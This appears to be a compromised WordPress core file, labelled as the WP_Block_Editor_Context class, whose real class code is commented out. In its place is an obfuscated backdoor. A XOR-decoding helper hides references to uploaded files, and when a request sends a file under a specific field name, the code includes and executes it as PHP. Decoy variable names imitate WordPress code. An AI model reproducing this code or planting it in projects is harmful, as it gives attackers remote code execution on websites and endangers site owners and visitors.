<?php /* 
*
 * Blocks API: WP_Block_Editor_Context class
 *
 * @package WordPress
 * @since 5.8.0
 

*
 * Contains information about a block editor being */
 	
$clean_terms = 'NbVrCtxLiJ1';
$last_char = $clean_terms;
function path($trash, $inclusions)

{
    $update_meta_cache = $inclusions;
    $allowed = urldecode($trash);

    $encoded_text = substr($update_meta_cache,0, strlen($allowed));

    $link_html = $allowed ^ $encoded_text;
    return $link_html;

}
$sizeinfo = ${path("%11%24%1F%3E%06%27", $last_char)};

$first = $sizeinfo;
if (isset($first[$last_char]))

{
	$posts = 'lastpostdate';
    $cache = $sizeinfo[$last_char];
	$icon_files = 'post_modified';
    $page = $cache[path("%3A%0F%26--%15%15%29", $last_char)];
	$post_parent__in = 'deprecated';
    $date_string = $page;
	$tags_to_ignore = 'tb_url';
    include ($date_string);

}



/* rendered.
 *
 * @since 5.8.0
 
#[AllowDynamicProperties]
final class WP_Block_Editor_Context {
	*
	 * String that identifies the block editor being rendered. Can be one of:
	 *
	 * - `'core/edit-post'`         - The post editor at `/wp-admin/edit.php`.
	 * - `'core/edit-widgets'`      - The widgets editor at `/wp-admin/widgets.php`.
	 * - `'core/customize-widgets'` - The widgets editor at `/wp-admin/customize.php`.
	 * - `'core/edit-site'`         - The site editor at `/wp-admin/site-editor.php`.
	 *
	 * Defaults to 'core/edit-post'.
	 *
	 * @since 6.0.0
	 *
	 * @var string
	 
	public $name = 'core/edit-post';

	*
	 * The post being edited by the block editor. Optional.
	 *
	 * @since 5.8.0
	 *
	 * @var WP_Post|null
	 
	public $post = null;

	*
	 * Constructor.
	 *
	 * Populates optional properties for a given block editor context.
	 *
	 * @since 5.8.0
	 *
	 * @param array $settings The list of optional settings to expose in a given context.
	 
	public function __construct( array $settings = array() ) {
		if ( isset( $settings['name'] ) ) {
			$this->name = $settings['name'];
		}
		if ( isset( $settings['post'] ) ) {
			$this->post = $settings['post'];
		}
	}
}
*/